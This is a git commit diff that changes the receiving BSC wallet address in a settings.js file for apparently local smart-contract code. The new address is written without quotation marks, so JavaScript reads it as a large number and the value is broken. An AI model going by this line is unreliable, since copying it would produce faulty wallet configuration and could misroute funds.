166859c32e3e78018c42c83228e1ebcf48516f32
mandizzi <62306356+mandizzi@users.noreply.github.com>
2024-08-24 10:30:45 +0000

    Update settings.js
    wallet num

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress =  0x49286191a90FbCAf914B5cd630549f48a2FE13C9     
 
 	
 var cryptotokenContract;
